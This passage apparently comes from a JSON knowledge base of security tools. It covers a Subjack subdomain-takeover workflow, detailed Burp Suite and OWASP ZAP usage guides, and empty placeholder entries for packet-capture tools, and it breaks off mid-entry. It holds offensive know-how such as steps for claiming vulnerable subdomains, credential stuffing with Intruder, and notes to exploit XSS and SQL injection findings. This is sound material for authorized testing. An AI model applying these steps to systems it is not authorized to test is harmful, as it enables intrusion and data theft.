            "command": "dig CNAME suspicious.example.com"
          }
        ]
      }
    ],
    "workflow_guides": [
      {
        "name": "Subdomain enum \u2192 Subjack \u2192 Exploitation",
        "stages": [
          {
            "label": "Gather subdomains",
            "description": "Use Amass or Subfinder.",
            "command": "amass enum -passive -d example.com -o subs.txt"
          },
          {
            "label": "Check for takeovers",
            "description": "Scan for vulnerable CNAMEs.",
            "command": "subjack -w subs.txt -t 50 -ssl -o vulnerable.txt"
          },
          {
            "label": "Claim subdomain",
            "description": "Register service and point CNAME.",
            "command": "# Follow service-specific takeover process"
          }
        ]
      }
    ],
    "output_notes": [
      {
        "indicator": "[Vulnerable] dev.example.com -> s3.amazonaws.com",
        "meaning": "Subdomain pointing to unclaimed S3 bucket.",
        "severity": "critical"
      },
      {
        "indicator": "[Not Vulnerable] www.example.com",
        "meaning": "Subdomain properly configured.",
        "severity": "info"
      }
    ],
    "advanced_usage": [
      {
        "title": "Integration with continuous monitoring",
        "command": "subjack -w <(amass enum -passive -d example.com) -t 100 -ssl -a -o daily_check.txt",
        "scenario": "Combine with Amass for fresh subdomain checks daily.",
        "notes": [
          "Use with alerting systems to notify on new takeover opportunities."
        ]
      }
    ],
    "comparison_table": null,
    "resources": []
  },
  {
    "id": "burpsuite",
    "name": "Burp Suite",
    "summary": "Burp Suite is the leading toolkit for web application security testing, offering intercepting proxy, scanner, repeater, intruder, and extensibility via BApp Store. Available in Community (free) and Professional editions.",
    "installation_guides": [
      {
        "platform": "Debian/Ubuntu",
        "summary": "Install via official installer JAR or package manager for persistent installations.",
        "steps": [
          {
            "detail": "wget 'https://portswigger.net/burp/releases/download?product=community&type=linux' -O burpsuite_community.sh",
            "copyable": true
          },
          {
            "detail": "chmod +x burpsuite_community.sh && sudo ./burpsuite_community.sh",
            "copyable": true
          },
          {
            "detail": "burpsuite &",
            "copyable": true
          }
        ]
      },
      {
        "platform": "Kali Linux",
        "summary": "Pre-installed Community edition; upgrade to Pro with license key.",
        "steps": [
          {
            "detail": "burpsuite &",
            "copyable": true
          },
          {
            "detail": "For Pro: File > Import Project Options to load license",
            "copyable": false
          }
        ]
      },
      {
        "platform": "Docker / Alternative",
        "summary": "Run containerized Burp with X11 forwarding for GUI access.",
        "steps": [
          {
            "detail": "docker pull raesene/burp",
            "copyable": true
          },
          {
            "detail": "xhost +local:docker",
            "copyable": true
          },
          {
            "detail": "docker run --rm -e DISPLAY=$DISPLAY -v /tmp/.X11-unix:/tmp/.X11-unix raesene/burp",
            "copyable": true
          }
        ]
      },
      {
        "platform": "Snap / Flatpak",
        "summary": "Isolated installation via snap for sandboxed environment.",
        "steps": [
          {
            "detail": "sudo snap install burpsuite-community",
            "copyable": true
          },
          {
            "detail": "snap run burpsuite-community.burpsuite",
            "copyable": true
          }
        ]
      }
    ],
    "quick_examples": [
      {
        "description": "Launch Burp Suite",
        "command": "burpsuite &",
        "notes": []
      },
      {
        "description": "Configure browser proxy to 127.0.0.1:8080",
        "command": "# Set browser HTTP proxy to localhost:8080",
        "notes": []
      },
      {
        "description": "Export CA certificate for HTTPS interception",
        "command": "curl http://burp/cert -o burp_ca.der",
        "notes": []
      },
      {
        "description": "Import Burp CA into Firefox",
        "command": "# Preferences > Privacy & Security > Certificates > View Certificates > Import burp_ca.der",
        "notes": []
      }
    ],
    "common_flags": [],
    "operational_tips": [
      "Always configure proxy listeners on 127.0.0.1 to avoid exposing to network.",
      "Install Burp CA certificate in all test browsers and tools for HTTPS interception.",
      "Use Target > Site map to visualize application structure before testing.",
      "Enable Intercept > Response interception to modify server responses.",
      "Use Repeater for manual request manipulation and iterative testing.",
      "Intruder is powerful for automated fuzzing and credential stuffing.",
      "Professional edition scanner automates vulnerability detection.",
      "Save project files regularly to preserve state and findings.",
      "Use BApp Store extensions for specialized testing (e.g., JWT Editor, AuthMatrix).",
      "Configure upstream proxy in Burp for environments requiring proxy chains."
    ],
    "step_sequences": [
      {
        "title": "Initial proxy setup and certificate trust",
        "steps": [
          {
            "title": "Start Burp Suite",
            "details": "Launch Burp with temporary project or persistent saved project.",
            "command": "burpsuite &"
          },
          {
            "title": "Configure proxy listener",
            "details": "Verify Proxy > Options shows listener on 127.0.0.1:8080.",
            "command": "# Check Proxy > Options > Proxy Listeners"
          },
          {
            "title": "Set browser proxy",
            "details": "Configure browser to use HTTP proxy 127.0.0.1:8080 or use FoxyProxy extension.",
            "command": "# Firefox: Preferences > Network Settings > Manual proxy: 127.0.0.1:8080"
          },
          {
            "title": "Download Burp CA certificate",
            "details": "Navigate to http://burp/cert in browser and save the certificate.",
            "command": "curl http://burp/cert -o burp_ca.der"
          },
          {
            "title": "Install CA certificate",
            "details": "Import certificate into browser's trusted root store to enable HTTPS interception.",
            "command": "# Firefox: Preferences > Privacy & Security > View Certificates > Authorities > Import"
          },
          {
            "title": "Test interception",
            "details": "Enable Intercept and navigate to any HTTPS site to verify traffic capture.",
            "command": "# Toggle Proxy > Intercept is on"
          }
        ]
      },
      {
        "title": "Site mapping and reconnaissance",
        "steps": [
          {
            "title": "Add target to scope",
            "details": "Define scope in Target tab to focus on specific domains.",
            "command": "# Target > Scope > Add > example.com"
          },
          {
            "title": "Spider the application",
            "details": "Use Crawler (Pro) or manually browse to populate site map.",
            "command": "# Right-click target > Scan (Pro) or browse manually"
          },
          {
            "title": "Review site map",
            "details": "Examine discovered endpoints, parameters, and forms in Target > Site map.",
            "command": "# Target > Site map - expand tree to view all discovered paths"
          },
          {
            "title": "Analyze HTTP history",
            "details": "Review all requests/responses in Proxy > HTTP history for sensitive data.",
            "command": "# Proxy > HTTP history - filter by scope, status, MIME type"
          }
        ]
      },
      {
        "title": "Active testing with Repeater",
        "steps": [
          {
            "title": "Send request to Repeater",
            "details": "Right-click any interesting request in Proxy or Target and send to Repeater.",
            "command": "# Right-click request > Send to Repeater"
          },
          {
            "title": "Modify parameters",
            "details": "Edit request parameters, headers, or body to test for vulnerabilities.",
            "command": "# Repeater tab - modify request in top panel"
          },
          {
            "title": "Send modified request",
            "details": "Click Send button to submit modified request and view response.",
            "command": "# Click Send button"
          },
          {
            "title": "Analyze response",
            "details": "Check for error messages, reflected input, or anomalous behavior.",
            "command": "# Review response in bottom panel - Raw, Render, Hex views"
          }
        ]
      },
      {
        "title": "Automated fuzzing with Intruder",
        "steps": [
          {
            "title": "Send request to Intruder",
            "details": "Select a request suitable for parameter fuzzing.",
            "command": "# Right-click request > Send to Intruder"
          },
          {
            "title": "Configure attack positions",
            "details": "Mark parameters to fuzz with  symbols around target values.",
            "command": "# Intruder > Positions - Clear , then Add  around parameters"
          },
          {
            "title": "Load payloads",
            "details": "Select payload type and load wordlist or generate payloads.",
            "command": "# Intruder > Payloads - select type, load from file or paste list"
          },
          {
            "title": "Start attack",
            "details": "Launch attack and monitor results for interesting status codes or response lengths.",
            "command": "# Click Start attack button - Community edition is throttled"
          },
          {
            "title": "Analyze results",
            "details": "Sort by status code, length, or response time to identify anomalies.",
            "command": "# Results table - click column headers to sort, click request to view"
          }
        ]
      },
      {
        "title": "Scanner usage (Professional only)",
        "steps": [
          {
            "title": "Configure scan scope",
            "details": "Define what URLs and insertion points scanner should test.",
            "command": "# Dashboard > New scan > Scan configuration"
          },
          {
            "title": "Select scan type",
            "details": "Choose between Crawl and Audit, Audit only, or Crawl only.",
            "command": "# Select scan type: Crawl and audit for comprehensive testing"
          },
          {
            "title": "Start scan",
            "details": "Launch scan and monitor progress in Dashboard.",
            "command": "# Click OK to start scan"
          },
          {
            "title": "Review issues",
            "details": "Examine discovered vulnerabilities in Target > Issues.",
            "command": "# Target > Issue activity - sort by severity"
          },
          {
            "title": "Verify findings",
            "details": "Manually verify high severity issues using Repeater before reporting.",
            "command": "# Right-click issue > Send to Repeater"
          }
        ]
      },
      {
        "title": "Extension management and scripting",
        "steps": [
          {
            "title": "Open BApp Store",
            "details": "Access extensions marketplace for additional functionality.",
            "command": "# Extender > BApp Store"
          },
          {
            "title": "Install extension",
            "details": "Browse and install extensions like Logger++, Autorize, JWT Editor.",
            "command": "# BApp Store - select extension > Install"
          },
          {
            "title": "Configure extension",
            "details": "Access extension settings via Extender > Installed tab.",
            "command": "# Extender > Installed > select extension > Options"
          },
          {
            "title": "Write custom extension",
            "details": "Use Java, Python, or Ruby to create custom Burp extensions.",
            "command": "# Extender > Extensions > Add - load custom .py, .rb, or .jar"
          }
        ]
      }
    ],
    "workflow_guides": [
      {
        "name": "Complete web app security assessment",
        "stages": [
          {
            "label": "Setup and reconnaissance",
            "description": "Configure proxy, install CA cert, spider application.",
            "command": "burpsuite & # Configure browser proxy and spider target"
          },
          {
            "label": "Passive vulnerability scanning",
            "description": "Review proxy history and site map for information disclosure.",
            "command": "# Analyze HTTP history for sensitive data, error messages, debug info"
          },
          {
            "label": "Active testing",
            "description": "Use Repeater and Intruder for manual and automated testing.",
            "command": "# Test for SQLi, XSS, IDOR, CSRF, authentication bypass"
          },
          {
            "label": "Automated scanning",
            "description": "Run Professional scanner for comprehensive vulnerability detection.",
            "command": "# Dashboard > New scan > Configure and launch"
          },
          {
            "label": "Verification and reporting",
            "description": "Verify findings, document reproduction steps, generate report.",
            "command": "# Target > Issue activity > Export findings"
          }
        ]
      },
      {
        "name": "Authentication and session testing",
        "stages": [
          {
            "label": "Capture authentication flow",
            "description": "Intercept login requests to understand authentication mechanism.",
            "command": "# Enable intercept, perform login, analyze POST request"
          },
          {
            "label": "Test credential handling",
            "description": "Check for weak passwords, password policy, account lockout.",
            "command": "# Intruder with password list against login endpoint"
          },
          {
            "label": "Session token analysis",
            "description": "Examine cookies and tokens for entropy, expiration, secure flags.",
            "command": "# Sequencer > Select session token > Start capture"
          },
          {
            "label": "Authorization testing",
            "description": "Test for horizontal and vertical privilege escalation.",
            "command": "# Use Autorize extension or manually test with different user sessions"
          }
        ]
      },
      {
        "name": "API security testing",
        "stages": [
          {
            "label": "Import API definition",
            "description": "Load OpenAPI/Swagger spec for automatic endpoint discovery.",
            "command": "# Target > Import OpenAPI definition"
          },
          {
            "label": "Test authentication",
            "description": "Verify API key, OAuth, JWT token handling.",
            "command": "# Use JWT Editor extension for token manipulation"
          },
          {
            "label": "Fuzz API parameters",
            "description": "Test input validation, injection, and business logic.",
            "command": "# Intruder with API-specific payloads and Content-Type variations"
          },
          {
            "label": "Test rate limiting",
            "description": "Check for rate limiting and DDoS protection.",
            "command": "# Intruder with null payloads to send identical requests"
          }
        ]
      },
      {
        "name": "Macro and automation workflows",
        "stages": [
          {
            "label": "Record macro",
            "description": "Automate multi-step processes like login for authenticated scanning.",
            "command": "# Project options > Sessions > Macros > Add"
          },
          {
            "label": "Configure session handling",
            "description": "Set rules for automatic session token refresh.",
            "command": "# Project options > Sessions > Session handling rules > Add"
          },
          {
            "label": "Test with automation",
            "description": "Run scanner or Intruder with automatic authentication.",
            "command": "# Scanner will now handle authentication automatically"
          }
        ]
      }
    ],
    "output_notes": [
      {
        "indicator": "Request was redirected to SSL [302]",
        "meaning": "Application redirects HTTP to HTTPS; ensure testing covers both protocols.",
        "severity": "info"
      },
      {
        "indicator": "Serialized object was submitted",
        "meaning": "Potential deserialization vulnerability; test for RCE.",
        "severity": "warning"
      },
      {
        "indicator": "Cross-site scripting (reflected)",
        "meaning": "User input reflected without encoding; exploit with XSS payload.",
        "severity": "high"
      },
      {
        "indicator": "SQL injection (error-based)",
        "meaning": "Database errors indicate SQLi vulnerability; extract data or escalate.",
        "severity": "critical"
      },
      {
        "indicator": "Cookie without secure flag",
        "meaning": "Session cookie can be transmitted over HTTP; risk of interception.",
        "severity": "medium"
      },
      {
        "indicator": "Strict transport security not enforced",
        "meaning": "Missing HSTS header; potential for SSL stripping attacks.",
        "severity": "low"
      },
      {
        "indicator": "Out-of-band resource load",
        "meaning": "Application makes external requests; potential for SSRF or XXE.",
        "severity": "medium"
      }
    ],
    "advanced_usage": [
      {
        "title": "Headless Burp automation with REST API",
        "scenario": "Automate scanning in CI/CD pipelines without GUI.",
        "command": "java -jar -Xmx4g burpsuite_pro.jar --project-file=project.burp --config-file=config.json --unpause-spider-and-scanner",
        "notes": [
          "Professional edition required for REST API access.",
          "Configure scan settings in JSON config file.",
          "Poll API endpoints for scan status and results."
        ]
      },
      {
        "title": "Collaborator for out-of-band testing",
        "scenario": "Detect blind vulnerabilities like SSRF, XXE, DNS exfiltration.",
        "command": "# Burp automatically uses Collaborator server for out-of-band interactions",
        "notes": [
          "Professional edition includes Burp Collaborator.",
          "Self-host private Collaborator server for sensitive engagements.",
          "Monitor Collaborator interactions in separate tab."
        ]
      },
      {
        "title": "Custom scanning with Turbo Intruder",
        "scenario": "High-speed fuzzing that exceeds Intruder's capabilities.",
        "command": "# Install Turbo Intruder extension > Right-click request > Extensions > Turbo Intruder",
        "notes": [
          "Python-scriptable for complex attack logic.",
          "Supports pipelining and connection reuse for maximum speed.",
          "Useful for race conditions and high-volume testing."
        ]
      },
      {
        "title": "Mobile app testing with invisible proxy",
        "scenario": "Intercept mobile app traffic without proxy configuration.",
        "command": "# Proxy > Options > Edit listener > Request handling > Support invisible proxying",
        "notes": [
          "Redirect mobile device traffic via iptables to Burp listener.",
          "Install Burp CA on mobile device for HTTPS interception.",
          "Handle certificate pinning with Frida or SSL Kill Switch."
        ]
      },
      {
        "title": "WebSocket testing",
        "scenario": "Intercept and manipulate WebSocket communications.",
        "command": "# Proxy > WebSockets history - view and modify WebSocket messages",
        "notes": [
          "Burp automatically captures WebSocket traffic.",
          "Send messages to Repeater for manipulation.",
          "Test for injection, authentication bypass, and message tampering."
        ]
      }
    ],
    "comparison_table": {
      "title": "Burp Suite Community vs Professional",
      "headers": ["Feature", "Community", "Professional"],
      "rows": [
        ["Intercepting Proxy", "", ""],
        ["Repeater & Intruder", " (throttled)", " (unlimited)"],
        ["Scanner", "", ""],
        ["Collaborator", "", ""],
        ["Save/restore state", "Temporary only", ""],
        ["Extensions", "", ""],
        ["REST API", "", ""],
        ["Price", "Free", "$449/user/year"]
      ]
    },
    "resources": [
      {
        "label": "Official Documentation",
        "url": "https://portswigger.net/burp/documentation",
        "description": "Comprehensive Burp Suite user guide and reference."
      },
      {
        "label": "Web Security Academy",
        "url": "https://portswigger.net/web-security",
        "description": "Free training labs for web vulnerability testing with Burp."
      },
      {
        "label": "BApp Store",
        "url": "https://portswigger.net/bappstore",
        "description": "Browse and install Burp Suite extensions."
      }
    ]
  },
  {
    "id": "owasp-zap",
    "name": "OWASP ZAP",
    "summary": "OWASP Zed Attack Proxy (ZAP) is a free, open-source web application security scanner designed for finding vulnerabilities in web applications. It offers automated scanning, manual testing tools, and extensive API for CI/CD integration.",
    "installation_guides": [
      {
        "platform": "Debian/Ubuntu",
        "summary": "Install via snap or download standalone JAR for Java-based deployment.",
        "steps": [
          {
            "detail": "sudo snap install zaproxy --classic",
            "copyable": true
          },
          {
            "detail": "zaproxy",
            "copyable": true
          }
        ]
      },
      {
        "platform": "Kali Linux",
        "summary": "Pre-installed on Kali; update regularly for latest security checks.",
        "steps": [
          {
            "detail": "sudo apt update && sudo apt install -y zaproxy",
            "copyable": true
          },
          {
            "detail": "zaproxy &",
            "copyable": true
          }
        ]
      },
      {
        "platform": "Docker / Alternative",
        "summary": "Run ZAP in containers for headless scanning or GUI with X11 forwarding.",
        "steps": [
          {
            "detail": "docker pull owasp/zap2docker-stable",
            "copyable": true
          },
          {
            "detail": "docker run -u zap -p 8080:8080 -i owasp/zap2docker-stable zap-webswing.sh",
            "copyable": true
          },
          {
            "detail": "# Access ZAP via browser at http://localhost:8080/zap",
            "copyable": false
          }
        ]
      },
      {
        "platform": "Standalone JAR",
        "summary": "Cross-platform JAR for manual installation on any system with Java.",
        "steps": [
          {
            "detail": "wget https://github.com/zaproxy/zaproxy/releases/download/v2.14.0/ZAP_2.14.0_Linux.tar.gz",
            "copyable": true
          },
          {
            "detail": "tar -xvf ZAP_2.14.0_Linux.tar.gz",
            "copyable": true
          },
          {
            "detail": "cd ZAP_2.14.0 && ./zap.sh",
            "copyable": true
          }
        ]
      }
    ],
    "quick_examples": [
      {
        "description": "Launch ZAP GUI",
        "command": "zaproxy &",
        "notes": []
      },
      {
        "description": "Start ZAP in daemon mode for API access",
        "command": "zap.sh -daemon -port 8080 -config api.key=changeme",
        "notes": []
      },
      {
        "description": "Quick spider and scan via CLI",
        "command": "zap-cli quick-scan --self-contained --start-options '-config api.disablekey=true' http://example.com",
        "notes": []
      },
      {
        "description": "Generate SSL certificate for HTTPS interception",
        "command": "# Tools > Options > Dynamic SSL Certificates > Save",
        "notes": []
      },
      {
        "description": "Export scan report",
        "command": "# Report > Generate HTML Report",
        "notes": []
      }
    ],
    "common_flags": [],
    "operational_tips": [
      "Enable API key for remote access to prevent unauthorized scanning.",
      "Install ZAP root CA certificate in browsers for HTTPS interception.",
      "Use Context feature to define authentication and session management.",
      "Active scan can be intrusive; get authorization before running.",
      "Configure attack strength and threshold based on target sensitivity.",
      "Use ZAP HUD (Heads Up Display) for in-browser testing experience.",
      "Marketplace offers extensions for specialized testing needs.",
      "Save sessions regularly to preserve scan results and findings.",
      "Use automation framework for CI/CD pipeline integration.",
      "Review false positives before reporting vulnerabilities."
    ],
    "step_sequences": [
      {
        "title": "Initial setup and certificate configuration",
        "steps": [
          {
            "title": "Launch ZAP",
            "details": "Start ZAP in standard or daemon mode depending on use case.",
            "command": "zaproxy &"
          },
          {
            "title": "Configure local proxy",
            "details": "Verify ZAP is listening on localhost:8080 for HTTP/HTTPS traffic.",
            "command": "# Tools > Options > Local Proxies - default 127.0.0.1:8080"
          },
          {
            "title": "Generate dynamic SSL certificate",
            "details": "Create root CA certificate for HTTPS interception.",
            "command": "# Tools > Options > Dynamic SSL Certificates > Generate"
          },
          {
            "title": "Export root CA",
            "details": "Save owasp_zap_root_ca.cer to install in browsers and operating system.",
            "command": "# Tools > Options > Dynamic SSL Certificates > Save"
          },
          {
            "title": "Install CA in browser",
            "details": "Import certificate into Firefox, Chrome, or system trust store.",
            "command": "# Firefox: Preferences > Privacy > Certificates > View > Import owasp_zap_root_ca.cer"
          },
          {
            "title": "Configure browser proxy",
            "details": "Set browser to use ZAP proxy for all HTTP/HTTPS traffic.",
            "command": "# Browser proxy settings: 127.0.0.1:8080"
          }
        ]
      },
      {
        "title": "Manual exploration and passive scanning",
        "steps": [
          {
            "title": "Browse target application",
            "details": "Navigate through application with ZAP proxy enabled to build site tree.",
            "command": "# Browse application normally; ZAP captures all traffic"
          },
          {
            "title": "Review site tree",
            "details": "Examine discovered URLs, parameters, and forms in Sites tab.",
            "command": "# Sites tab shows hierarchical structure of discovered content"
          },
          {
            "title": "Check passive scan alerts",
            "details": "Review findings from passive scanning in Alerts tab.",
            "command": "# Alerts tab - vulnerabilities found without active probing"
          },
          {
            "title": "Analyze HTTP messages",
            "details": "Inspect requests and responses in History tab for manual analysis.",
            "command": "# History tab - filter by host, method, or response code"
          }
        ]
      },
      {
        "title": "Active scanning workflow",
        "steps": [
          {
            "title": "Define scan scope",
            "details": "Add target URLs to context and scope to focus scanning.",
            "command": "# Right-click site in tree > Include in Context > Default Context"
          },
          {
            "title": "Configure scan policy",
            "details": "Customize active scan rules and thresholds based on target.",
            "command": "# Analyze > Scan Policy Manager > Add/Modify policy"
          },
          {
            "title": "Start active scan",
            "details": "Launch active scan against defined scope with selected policy.",
            "command": "# Right-click context > Attack > Active Scan"
          },
          {
            "title": "Monitor scan progress",
            "details": "Watch active scan status in bottom panel and adjust if needed.",
            "command": "# Active Scan tab shows progress, pause/resume controls"
          },
          {
            "title": "Review scan results",
            "details": "Examine discovered vulnerabilities in Alerts tab, sorted by risk.",
            "command": "# Alerts tab - high/medium/low/informational findings"
          },
          {
            "title": "Verify findings",
            "details": "Manually reproduce critical alerts before reporting.",
            "command": "# Request tab > Manual Request Editor to replay attacks"
          }
        ]
      },
      {
        "title": "Spider and AJAX spider configuration",
        "steps": [
          {
            "title": "Traditional spider",
            "details": "Crawl application by following links and forms.",
            "command": "# Right-click site > Attack > Spider"
          },
          {
            "title": "Configure spider options",
            "details": "Set maximum depth, thread count, and scope restrictions.",
            "command": "# Tools > Options > Spider - configure depth and threads"
          },
          {
            "title": "AJAX spider for JavaScript apps",
            "details": "Use browser-based crawler for single-page applications.",
            "command": "# Right-click site > Attack > AJAX Spider"
          },
          {
            "title": "Monitor spider progress",
            "details": "View discovered URLs and completion status.",
            "command": "# Spider tab shows crawl progress and discovered nodes"
          }
        ]
      },
      {
        "title": "Authentication and session management",
        "steps": [
          {
            "title": "Create authentication context",
            "details": "Define context for authenticated portions of application.",
            "command": "# Session > New Context > Include in Scope"
          },
          {
            "title": "Configure authentication method",
            "details": "Set up form-based, script-based, or manual authentication.",
            "command": "# Context > Authentication > Form-based or Script-based"
          },
          {
            "title": "Set credentials",
            "details": "Add valid user accounts for authenticated scanning.",
            "command": "# Context > Users > Add user with credentials"
          },
          {
            "title": "Configure session management",
            "details": "Define how ZAP should maintain session tokens.",
            "command": "# Context > Session Management > Cookie-based or Script"
          },
          {
            "title": "Verify authentication",
            "details": "Test authentication by forcing user mode and browsing.",
            "command": "# Enable Force User Mode, browse authenticated areas"
          }
        ]
      },
      {
        "title": "ZAP HUD (Heads Up Display) usage",
        "steps": [
          {
            "title": "Enable HUD",
            "details": "Activate in-browser testing interface overlay.",
            "command": "# Tools > Options > HUD > Enable when using the ZAP Desktop"
          },
          {
            "title": "Configure HUD browser",
            "details": "Launch Firefox with ZAP HUD enabled.",
            "command": "# HUD menu > Launch Browser"
          },
          {
            "title": "Use HUD tools",
            "details": "Access scan, attack, and analysis tools via browser overlay.",
            "command": "# HUD buttons appear on left and right sides of browser"
          },
          {
            "title": "View alerts in-context",
            "details": "See vulnerabilities highlighted directly on vulnerable pages.",
            "command": "# Alerts appear as badges on page elements"
          }
        ]
      }
    ],
    "workflow_guides": [
      {
        "name": "Complete web application assessment",
        "stages": [
          {
            "label": "Reconnaissance",
            "description": "Install CA cert, configure proxy, manually explore application.",
            "command": "zaproxy & # Browse application to populate site tree"
          },
          {
            "label": "Automated discovery",
            "description": "Run spider and AJAX spider for comprehensive crawling.",
            "command": "# Attack > Spider + AJAX Spider"
          },
          {
            "label": "Passive analysis",
            "description": "Review passive scan results for low-hanging fruit.",
            "command": "# Check Alerts tab for passive findings"
          },
          {
            "label": "Active scanning",
            "description": "Launch active scan with appropriate policy and scope.",
            "command": "# Right-click context > Attack > Active Scan"
          },
          {
            "label": "Manual verification",
            "description": "Validate critical findings using request editor and fuzzer.",
            "command": "# Use Requester tab and Fuzzer for manual testing"
          },
          {
            "label": "Reporting",
            "description": "Generate HTML/XML/JSON reports with findings and remediation.",
            "command": "# Report > Generate HTML Report"
          }
        ]
      },
      {
        "name": "API security testing",
        "stages": [
          {
            "label": "Import API definition",
            "description": "Load OpenAPI/Swagger specification for automatic endpoint discovery.",
            "command": "# Import > Import an OpenAPI definition from URL or file"
          },
          {
            "label": "Explore API",
            "description": "Send requests to all defined endpoints to populate history.",
            "command": "# Sites tree shows all API endpoints from spec"
          },
          {
            "label": "Configure API scan",
            "description": "Set authentication headers, tokens, and scan policy.",
            "command": "# Add Authorization header in HTTP Sender Script"
          },
          {
            "label": "Active scan API",
            "description": "Launch targeted scan against API endpoints.",
            "command": "# Right-click API context > Active Scan"
          }
        ]
      },
      {
        "name": "CI/CD integration with automation framework",
        "stages": [
          {
            "label": "Start ZAP in daemon mode",
            "description": "Launch headless ZAP with API enabled.",
            "command": "zap.sh -daemon -port 8080 -config api.key=your-api-key"
          },
          {
            "label": "Configure automation plan",
            "description": "Create YAML automation framework plan for scanning.",
            "command": "# Create automation.yaml with job definitions"
          },
          {
            "label": "Execute automation plan",
            "description": "Run scan via automation framework with specified configuration.",
            "command": "zap.sh -cmd -autorun automation.yaml"
          },
          {
            "label": "Retrieve results",
            "description": "Export findings via API or generated reports.",
            "command": "curl http://localhost:8080/JSON/core/view/alerts/?apikey=your-api-key"
          },
          {
            "label": "Fail build on findings",
            "description": "Parse results and exit with error code if high-risk issues found.",
            "command": "# CI script checks alert severity and fails build accordingly"
          }
        ]
      },
      {
        "name": "Authenticated scanning workflow",
        "stages": [
          {
            "label": "Record authentication",
            "description": "Manually log in while ZAP captures authentication flow.",
            "command": "# Enable ZAP proxy and perform login"
          },
          {
            "label": "Configure context authentication",
            "description": "Set up authentication method using captured login request.",
            "command": "# Session > New Context > Authentication > Form-based"
          },
          {
            "label": "Add test users",
            "description": "Define user accounts with valid credentials for scanning.",
            "command": "# Context > Users > Add with username/password"
          },
          {
            "label": "Scan as authenticated user",
            "description": "Run spider and active scan with forced user mode.",
            "command": "# Enable Force User Mode > Attack > Spider and Active Scan"
          }
        ]
      }
    ],
    "output_notes": [
      {
        "indicator": "High (Reliability: Confirmed)",
        "meaning": "Critical vulnerability verified by ZAP; immediate attention required.",
        "severity": "critical"
      },
      {
        "indicator": "Medium (Reliability: Suspicious)",
        "meaning": "Potential vulnerability requiring manual verification before reporting.",
        "severity": "warning"
      },
      {
        "indicator": "SQL Injection",
        "meaning": "Database injection vulnerability detected; test with manual payloads.",
        "severity": "critical"
      },
      {
        "indicator": "Cross Site Scripting (Reflected)",
        "meaning": "User input reflected without sanitization; exploit with XSS payload.",
        "severity": "high"
      },
      {
        "indicator": "Application Error Disclosure",
        "meaning": "Verbose error messages reveal internal details; information disclosure risk.",
        "severity": "medium"
      },
      {
        "indicator": "Cookie No HttpOnly Flag",
        "meaning": "Session cookies accessible via JavaScript; XSS can steal sessions.",
        "severity": "low"
      },
      {
        "indicator": "X-Frame-Options Header Not Set",
        "meaning": "Missing clickjacking protection; application can be framed.",
        "severity": "medium"
      },
      {
        "indicator": "Timestamp Disclosure - Unix",
        "meaning": "Unix timestamps in responses may leak information; generally low risk.",
        "severity": "info"
      }
    ],
    "advanced_usage": [
      {
        "title": "Scripting with ZAP API",
        "scenario": "Automate complex scanning workflows via Python, Java, or JavaScript API clients.",
        "command": "from zapv2 import ZAPv2\nzap = ZAPv2(apikey='changeme', proxies={'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'})\nzap.spider.scan('http://example.com')",
        "notes": [
          "Install python-owasp-zap-v2.4 package for Python client.",
          "API supports full ZAP functionality including scan control and reporting.",
          "Use for CI/CD integration, custom workflows, and orchestration."
        ]
      },
      {
        "title": "Custom scan policies and rules",
        "scenario": "Create tailored scan policies for specific application types or compliance requirements.",
        "command": "# Analyze > Scan Policy Manager > Add > Configure thresholds and rules",
        "notes": [
          "Adjust attack strength per rule to balance speed and thoroughness.",
          "Disable irrelevant rules to reduce scan time and false positives.",
          "Export policies for reuse across engagements."
        ]
      },
      {
        "title": "Fuzzer for advanced input testing",
        "scenario": "Fuzz specific parameters with custom wordlists and payloads.",
        "command": "# Right-click parameter in Request > Fuzz > Add payloads from file or generator",
        "notes": [
          "Supports multiple fuzzers per request for complex testing scenarios.",
          "Processors can encode, hash, or transform payloads before sending.",
          "Results filterable by response code, length, or regex patterns."
        ]
      },
      {
        "title": "Script-based authentication for complex flows",
        "scenario": "Handle multi-step authentication or non-standard login mechanisms.",
        "command": "# Context > Authentication > Script-based > Load or write JavaScript/Zest script",
        "notes": [
          "Supports JavaScript and Zest scripting languages.",
          "Scripts can handle OAuth, SAML, multi-factor authentication flows.",
          "Test scripts via manual request before using in automated scans."
        ]
      },
      {
        "title": "Marketplace add-ons for specialized testing",
        "scenario": "Extend ZAP capabilities with community and official extensions.",
        "command": "# Help > Check for Updates > Marketplace tab > Install add-ons",
        "notes": [
          "Popular add-ons: Advanced SQLInjection Scanner, XSS Scanner, WebSockets.",
          "Community scripts available for specific vulnerability types.",
          "Keep add-ons updated for latest detection capabilities."
        ]
      }
    ],
    "comparison_table": {
      "title": "ZAP vs Burp Suite Comparison",
      "headers": ["Feature", "OWASP ZAP", "Burp Suite Pro"],
      "rows": [
        ["Price", "Free & Open Source", "$449/user/year"],
        ["Intercepting Proxy", "", ""],
        ["Automated Scanner", "", ""],
        ["Active Scan Speed", "Fast (unlimited)", "Fast (unlimited)"],
        ["API for Automation", " Full REST API", " REST API"],
        ["Scripting", "JavaScript/Python/Zest", "Java/Python/Ruby"],
        ["Fuzzer", " Built-in", " Intruder"],
        ["HUD/In-browser", " ZAP HUD", ""],
        ["CI/CD Integration", " Automation Framework", " Enterprise/Cloud"],
        ["Community", "Large OSS community", "Professional support"]
      ]
    },
    "resources": [
      {
        "label": "Official Documentation",
        "url": "https://www.zaproxy.org/docs/",
        "description": "Comprehensive ZAP user guide and API documentation."
      },
      {
        "label": "Automation Framework Guide",
        "url": "https://www.zaproxy.org/docs/automate/automation-framework/",
        "description": "YAML-based automation for CI/CD integration."
      },
      {
        "label": "ZAP in Ten",
        "url": "https://www.zaproxy.org/zap-in-ten/",
        "description": "Quick video tutorials covering core ZAP features."
      },
      {
        "label": "OWASP ZAP API",
        "url": "https://www.zaproxy.org/docs/api/",
        "description": "Full API reference for programmatic control."
      }
    ]
  },
  {
    "id": "wireshark",
    "name": "Unknown Tool",
    "summary": "No instructions are available for this tool yet.",
    "installation_guides": [],
    "quick_examples": [],
    "common_flags": [],
    "operational_tips": [],
    "step_sequences": [],
    "workflow_guides": [],
    "output_notes": [],
    "advanced_usage": [],
    "comparison_table": null,
    "resources": []
  },
  {
    "id": "tshark",
    "name": "Unknown Tool",
    "summary": "No instructions are available for this tool yet.",
    "installation_guides": [],
    "quick_examples": [],
    "common_flags": [],
    "operational_tips": [],
    "step_sequences": [],
    "workflow_guides": [],
    "output_notes": [],
    "advanced_usage": [],
    "comparison_table": null,
    "resources": []
  },
  {
    "id": "tcpdump",
    "name": "Unknown Tool",
    "summary": "No instructions are available for this tool yet.",
    "installation_guides": [],
    "quick_examples": [],
    "common_flags": [],
